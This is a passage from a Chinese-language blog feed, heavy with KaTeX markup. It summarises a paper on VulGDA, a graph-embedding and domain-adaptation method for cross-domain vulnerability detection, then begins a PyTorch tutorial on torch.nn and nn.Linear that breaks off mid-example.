mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008664em;vertical-align:-0.258664em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>  和目标域中的未标记数据集 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msubsup><mo stretchy="false">}</mo><mrow><mi>i</mi><mo>=</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mi>N</mi></msubsup><mo>∼</mo><mo stretchy="false">(</mo><msubsup><mi>D</mi><mi>T</mi><mi>X</mi></msubsup><msup><mo stretchy="false">)</mo><mrow><mi>N</mi><mo>−</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">T=\{({x}_{i})\}_{i=n+1}^{N}\sim(D_{T}^{X})^{N-n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.158326em;vertical-align:-0.316995em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mathdefault mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.316995em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1166619999999998em;vertical-align:-0.275331em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.424669em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.275331em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>是训练样本的总数，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>D</mi><mi>T</mi><mi>X</mi></msubsup></mrow><annotation encoding="application/x-tex">D_T^X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1166619999999998em;vertical-align:-0.275331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.424669em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.275331em;"><span></span></span></span></span></span></span></span></span></span>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">D_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>上的边缘分布。</p><p>最终目标是建立一个预测<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>η</mi><mo>:</mo><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">η:X→Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>：最小<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><msub><mi>D</mi><mi>T</mi></msub></msub><mo stretchy="false">(</mo><mi>η</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">*</mi><mo>⁡</mo><msub><mrow><mi>P</mi><mi>r</mi></mrow><mrow><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><mo>∼</mo><msub><mi>D</mi><mi>T</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>η</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">≠</mi><mi>y</mi><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">R_{D_T}(η)=\operatorname*{Pr}_{(x y)\sim D_{T}}(\eta(x)\neq y),</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.000305em;vertical-align:-0.250305em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.250305em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mop"><span class="mord mathrm">*</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∼</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567071428571427em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.14329285714285717em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mpunct">,</span></span></span></span>，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">D_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中没有监督信息。</p><p><strong>VuLGDA有两个阶段组成：</strong></p><p><strong>图嵌入：</strong></p><p>图嵌入阶段的目的是将源代码中的漏洞样本转换为可由机器学习模型处理的实值向量。因此，通过句法和语义分析，图嵌入阶段首先将样本转换为CPG，即图结构中的中间表示。在CPG中，语法和语义相关的元素被直接连接在一起，这缓解了长期的依赖问题和域之间的分歧。然后，利用预训练的单词嵌入生成标记嵌入和节点嵌入。最后，我们使用GGNN通过传播和聚合来自CPG中定义的邻居的信息来获得嵌入向量。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191747401.png" alt="image-20231219174742348"></p><p><strong>域自适应：</strong></p><p>域自适应阶段旨在学习在域之间转换分布的特征生成器。提出了一种由特征生成器、分类器和瓶颈组成的神经网络来学习该特征生成器。将源域中的特征作为输入的分类器产生分类损失。瓶颈度量源域和目标域中的特征之间的差异。通过最小化分类损失和领域差异来优化特征生成器。检测结果由生成的“深层”特征训练的分类器报告。经过上述阶段后，VulGDA可以在目标域中检测跨域漏洞，而无需标记数据。</p><p>本文的创新点主要在于领域自适应：</p><p>传统的机器学习方法假设训练数据和测试数据服从相同的特征分布。然而，由于编程风格和应用场景的不同，不同领域的漏洞特征可能服从不同的分布，从而影响模型的检测性能。在本节中，使用来自源域和目标域的数据，我们构建了一个特征生成器G f:XG→XF。G f将嵌入XG的图转换为“深度”特征向量XF，该向量对漏洞检测具有判别性，并且随着域之间的移动而不变。因此，目标函数定义为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo>∗</mo></msup><mo>=</mo><mi>arg</mi><mo>⁡</mo><mi mathvariant="normal">*</mi><mo>⁡</mo><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow><mfrac><mn>1</mn><mi>B</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>B</mi></munderover><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>λ</mi><mi>R</mi><mo stretchy="false">(</mo><msub><mi>B</mi><mi>S</mi></msub><mo separator="true">,</mo><msub><mi>B</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f^{*}=\arg\operatorname*{min}\frac{1}{B}\sum_{i=1}^{B}\ell(f(x_{i}),y_{i})+\lambda R(B_{S},B_{T})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.933136em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.106005em;vertical-align:-1.277669em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">*</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">λ</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>其中B表示批次大小，（f（xi），yi）表示分类损失，BS和BT分别在源域和目标域中为2个批次，R（∗，∗）测量域差异。λ用于调整分类损失和域差异的权重。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312192225166.png" alt="image-20231219222546132"></p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pytorch入门</title>
      <link href="/2023/12/19/AILearning/pytorch/pytorch/"/>
      <url>/2023/12/19/AILearning/pytorch/pytorch/</url>
      
        <content type="html"><![CDATA[<h1 id="1torchnn简介">1.torch.nn简介</h1><p>1.1torch.nn相关库的导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#环境准备</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np              <span class="comment"># numpy数组库</span></span><br><span class="line"><span class="keyword">import</span> math                     <span class="comment"># 数学运算库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment"># 画图库</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> torch             <span class="comment"># torch基础库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn    <span class="comment"># torch神经网络库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br></pre></td></tr></table></figure><h3 id="12-torchnn概述">1.2 torch.nn概述</h3><blockquote><p>Pytorch提供了几个设计得非常棒的模块和类，比如 torch.nn，torch.optim，Dataset 以及 DataLoader，来帮助程序员设计和训练神经网络。</p></blockquote><p>nn是Neural Network的简称，帮助程序员方便执行如下的与神经网络相关的行为：</p><ul><li><p>创建神经网络</p></li><li><p>训练神经网络</p></li><li><p>保存神经网络</p></li><li><p>恢复神经网络</p></li></ul><p>包括五大基本功能模块</p><ul><li>torch.nn是专门为神经网络设计的模块化接口</li><li>nn构建于autograd之上，可以用来定义和运行神经网络<ul><li>nn.Parameter</li><li>nn.Linear</li><li>nn.functional</li><li>nn.Module</li><li>nn.Sequential</li></ul></li></ul><h1 id="2nnlinear类全连接层">2.nn.Linear类（全连接层）</h1><h3 id="21函数功能">2.1函数功能</h3><p>用于创建一个多输入、多输出的全连接层。</p><p>nn.Linear本身并不包含激活函数（Functional）</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635002.png" alt="image-20231219163552911"></p><h3 id="22函数说明">2.2函数说明</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191629041.png" alt="image-20211203155643310"></p><ul><li>in_featrues：<ul><li>指输入的二维张量的大小，即输入的[batch_size, size]中的size</li><li>in_features的数量，决定的参数的个数Y=WX+b，X的维度就是in_features，X的维度决定W的维度，总参数的个数 = in_features + 1</li></ul></li><li>out_featrues<ul><li>指的是输出的二维张量的大小，<mark>即输出的二维张量的形状为[batch_size output_size].</mark></li><li>out_features的数量，决定了全连接层中神经元的个数，因为每个神经元只有一个输出。<strong>多少个输出，就需要多少个神经元</strong>。</li><li><mark>从输入输出的张量的shape角度来理解，相当于一个输入为[batch_size, in_features]的张量变换成了[batch_size, out_features]的输出张量。</mark></li></ul></li></ul><h3 id="23多个全连接层构建全连接网络">2.3多个全连接层构建全连接网络</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191629046.png" alt="image-20211203160715687"></p><ul><li>使用nn.Linear类创建全连接层</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nn.Linear</span></span><br><span class="line"><span class="comment"># 建立单层的多输入、多输出全连接层</span></span><br><span class="line"><span class="comment"># in_features由输入张量的形状决定，out_features则决定了输出张量的形状 </span></span><br><span class="line">full_connect_layer = nn.Linear(in_features = <span class="number">28</span> * <span class="number">28</span> * <span class="number">1</span>, out_features = <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;full_connect_layer:&quot;</span>, full_connect_layer)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;parameters        :&quot;</span>, full_connect_layer.parameters)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假定输入的图像形状为[28,28,1]</span></span><br><span class="line">x_input = torch.randn(<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将四维张量转换为二维张量之后，才能作为全连接层的输入</span></span><br><span class="line">x_input = x_input.view(<span class="number">1</span>, <span class="number">28</span> * <span 